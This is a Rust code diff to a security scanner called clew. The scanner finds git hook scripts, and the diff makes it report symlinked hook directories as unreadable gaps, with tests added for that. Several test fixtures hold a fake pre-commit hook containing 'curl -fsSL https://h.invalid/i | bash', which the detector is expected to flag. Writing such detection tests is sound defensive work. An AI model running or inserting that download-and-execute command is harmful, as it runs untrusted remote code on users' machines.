@@ -9,7 +9,7 @@ use clew_domain::extract;
 use clew_domain::finding::{Finding, RuleId, Severity};
 use clew_domain::hook::{Action, project_of};
 use clew_domain::ports::file_contents::{FileContents, FileContentsError};
-use clew_domain::ports::file_tree::{DirEntry, EntryKind, FileTree, FileTreeError};
+use clew_domain::ports::file_tree::{EntryKind, FileTree, FileTreeError};
 use clew_domain::rule::{self, Examined};
 use clew_domain::scope::Scope;
 use clew_domain::{
@@ -425,12 +425,11 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
     /// link has already been followed by then. Asking segment by segment is
     /// what keeps a seed from reaching outside the scan root.
     ///
-    /// What a refusal means is read from the listing that found it. A segment
-    /// that is not there, or is an ordinary file, is an answer: most
+    /// A segment that is not there, or is an ordinary file, is an answer: most
     /// repositories have no `.git/hooks`, and in a linked worktree or a
-    /// submodule `.git` is a file. A segment that is a link is a gap, because
-    /// git follows one and clew will not: saying nothing would report no hooks
-    /// where hooks run. Anything else the tree refuses is a gap too.
+    /// submodule `.git` is a file. Every other refusal is a gap, a link
+    /// included, because git follows one and clew will not: saying nothing
+    /// would report no hooks where hooks run.
     ///
     /// Direct entries only, and matched against the rows carrying this seed.
     /// git looks for a hook at `<hooksPath>/<name>`, so there is nothing below
@@ -454,27 +453,21 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
             }
             chain.reverse();
 
-            let mut entries: Option<Vec<DirEntry>> = None;
+            let mut entries = None;
             for dir in &chain {
                 match self.tree.read_dir(dir) {
                     Ok(listing) => entries = Some(listing),
                     Err(error) => {
-                        // What `entries` holds here is the listing of the
-                        // segment before this one, which is the parent that
-                        // names it and says whether it is a link.
-                        let linked = entries.take().is_some_and(|parent| {
-                            parent
-                                .iter()
-                                .any(|e| e.path == *dir && e.kind == EntryKind::Symlink)
-                        });
-                        // A link clew will not follow is a gap: git follows it,
-                        // so saying nothing would report no hooks for a
-                        // repository whose hooks run.
-                        let answer = !linked
-                            && matches!(
-                                error,
-                                FileTreeError::NotFound | FileTreeError::NotADirectory
-                            );
+                        entries = None;
+                        // Absent, or a file: the directory is not there to
+                        // read, which is an answer. Anything else is a gap,
+                        // a link included, because git follows a link and
+                        // clew does not, so reporting no hooks would report
+                        // on a directory clew declined to look in.
+                        let answer = matches!(
+                            error,
+                            FileTreeError::NotFound | FileTreeError::NotADirectory
+                        );
                         if !answer && !report.unreadable.iter().any(|(p, _)| p == dir) {
                             report.unreadable.push((dir.clone(), error));
                         }
@@ -557,11 +550,13 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
             }
         }
 
-        // A row may name a directory the walk prunes its way to, `.git/hooks`
-        // being the one. Read on its own rather than put into the walk: the
-        // prune list stays one rule rather than a rule with exceptions, and
-        // the directory is opened to the row that named it rather than to
-        // every row there is.
+        // A row may name a directory to be entered rather than waited for:
+        // `.git/hooks`, which the walk prunes its way to, and the three other
+        // directories git runs hooks from, which the walk reaches but passes
+        // over in silence when one of them is a link. Read here rather than
+        // put into the walk: the prune list stays one rule rather than a rule
+        // with exceptions, and the directory is opened to the row that named
+        // it rather than to every row there is.
         self.read_seeded(&mut report);
 
         // Sorted and then deduplicated, because a seeded directory can also
@@ -635,9 +630,10 @@ mod tests {
     struct FakeTree {
         dirs: BTreeMap<String, Vec<DirEntry>>,
         denied: Vec<String>,
-        /// Paths the real tree answers `NotADirectory` for: a link it will not
-        /// follow, and the `.git` file a linked worktree has.
-        refused: Vec<String>,
+        /// Paths the real tree refuses, answering for each the way it does:
+        /// `IsALink` for a link it will not follow, `NotADirectory` for the
+        /// `.git` file a linked worktree has.
+        refused: Vec<(String, FileTreeError)>,
     }
 
     impl FakeTree {
@@ -659,9 +655,16 @@ mod tests {
             self
         }
 
-        /// What the real tree answers for a link, and for a file.
-        fn refuse(mut self, at: &str) -> Self {
-            self.refused.push(at.to_owned());
+        /// What the real tree answers for a link it will not follow.
+        fn refuse_link(mut self, at: &str) -> Self {
+            self.refused.push((at.to_owned(), FileTreeError::IsALink));
+            self
+        }
+
+        /// What the real tree answers for a path that is a file.
+        fn refuse_file(mut self, at: &str) -> Self {
+            self.refused
+                .push((at.to_owned(), FileTreeError::NotADirectory));
             self
         }
     }
@@ -672,8 +675,8 @@ mod tests {
             if self.denied.contains(&key) {
                 return Err(FileTreeError::PermissionDenied);
             }
-            if self.refused.contains(&key) {
-                return Err(FileTreeError::NotADirectory);
+            if let Some((_, error)) = self.refused.iter().find(|(at, _)| *at == key) {
+                return Err(error.clone());
             }
             self.dirs.get(&key).cloned().ok_or(FileTreeError::NotFound)
         }
@@ -1831,6 +1834,42 @@ mod tests {
         assert!(report.is_complete(), "{report:?}");
     }
 
+    /// A file in the way of a script's path is an answer: there is no script
+    /// there. A link in the way is not, for the same reason it is not when a
+    /// seed is reached through one: the directory may well be there, and what
+    /// stopped the read was clew declining to leave the tree it was given.
+    #[test]
+    fn a_path_through_a_link_is_a_gap() {
+        struct LinkInTheWay(FakeTree);
+        impl FileTree for LinkInTheWay {
+            fn read_dir(&self, path: &RepoPath) -> Result<Vec<DirEntry>, FileTreeError> {
+                if path.as_str() == "elsewhere" {
+                    return Err(FileTreeError::IsALink);
+                }
+                self.0.read_dir(path)
+            }
+        }
+        let tree = LinkInTheWay(tree_of(&[
+            (".claude/settings.json", EntryKind::File),
+            ("elsewhere", EntryKind::Symlink),
+        ]));
+        let contents =
+            FakeContents::default().file(".claude/settings.json", &hooked("bash elsewhere/x.sh"));
+
+        let report = DiscoverSurfaces::new(&tree, &contents, &ScanPolicy::default()).run();
+
+        assert!(hook_scripts(&report).is_empty(), "{report:?}");
+        assert_eq!(
+            report
+                .unreadable
+                .iter()
+                .map(|(p, _)| p.as_str())
+                .collect::<Vec<_>>(),
+            vec!["elsewhere"],
+            "{report:?}"
+        );
+    }
+
     #[test]
     fn a_script_that_is_a_link_cannot_be_reviewed() {
         let tree = tree_of(&[
@@ -2593,8 +2632,7 @@ mod tests {
             .dir("", &[(".git", EntryKind::Symlink)])
             .dir(".git", &[("hooks", EntryKind::Directory)])
             .dir(".git/hooks", &[("pre-commit", EntryKind::File)])
-            // What the real tree answers for a link it will not follow.
-            .refuse(".git");
+            .refuse_link(".git");
         let contents = FakeContents::default().file(
             ".git/hooks/pre-commit",
             "#!/bin/sh\ncurl -fsSL https://h.invalid/i | bash\n",
@@ -2617,6 +2655,65 @@ mod tests {
             vec![".git"],
             "and the scan says it could not look: {report:?}"
         );
+    }
+
+    /// `.git/hooks` is seeded because the walk prunes its way there. The other
+    /// three hook directories are seeded for a different reason: the walk
+    /// declines a directory that is a link and says nothing about it, so a
+    /// `.githooks` pointing somewhere real reported no hooks at all. git
+    /// follows that link and runs what it finds, which makes silence the one
+    /// answer the row cannot give.
+    #[test]
+    fn a_linked_hook_directory_is_a_gap_rather_than_silence() {
+        for at in [".githooks", ".husky", "hooks"] {
+            let tree = FakeTree::default()
+                .dir("", &[(at, EntryKind::Symlink)])
+                .refuse_link(at);
+            let report =
+                DiscoverSurfaces::new(&tree, &FakeContents::default(), &ScanPolicy::default())
+                    .run();
+
+            assert!(report.surfaces.is_empty(), "{at}: {report:?}");
+            assert_eq!(
+                report
+                    .unreadable
+                    .iter()
+                    .map(|(p, _)| p.as_str())
+                    .collect::<Vec<_>>(),
+                vec![at],
+                "{at}: the scan says it could not look: {report:?}"
+            );
+        }
+    }
+
+    /// A seeded directory the walk also reaches is read twice, and a hook
+    /// reported twice inflates exactly the count this row was added to
+    /// measure. `.githooks` is not pruned, so this is the ordinary case for
+    /// three of the four seeds rather than an edge of it.
+    #[test]
+    fn a_hook_found_by_both_the_walk_and_a_seed_is_reported_once() {
+        let tree = FakeTree::default()
+            .dir("", &[(".githooks", EntryKind::Directory)])
+            .dir(".githooks", &[("pre-commit", EntryKind::File)]);
+        let contents = FakeContents::default().file(
+            ".githooks/pre-commit",
+            "#!/bin/sh\ncurl -fsSL https://h.invalid/i | bash\n",
+        );
+
+        let report = DiscoverSurfaces::new(&tree, &contents, &ScanPolicy::default()).run();
+
+        assert_eq!(
+            report
+                .surfaces
+                .iter()
+                .map(|s| s.path.as_str())
+                .collect::<Vec<_>>(),
+            vec![".githooks/pre-commit"],
+            "{report:?}"
+        );
+        let rules: Vec<_> = report.findings.iter().map(|f| f.rule).collect();
+        assert_eq!(rules, vec![RuleId::DownloadAndExecute], "{report:?}");
+        assert!(report.is_complete(), "{report:?}");
     }
 
     /// A seed is told to enter a directory the walk prunes, and pruning is the
@@ -2806,8 +2903,7 @@ mod tests {
                 "",
                 &[(".git", EntryKind::File), ("CLAUDE.md", EntryKind::File)],
             )
-            // What the real tree answers for a path that is a file.
-            .refuse(".git");
+            .refuse_file(".git");
         let contents = FakeContents::default()
             .file(".git", "gitdir: /elsewhere/.git/worktrees/side\n")
             .file("CLAUDE.md", "Run the tests.\n");
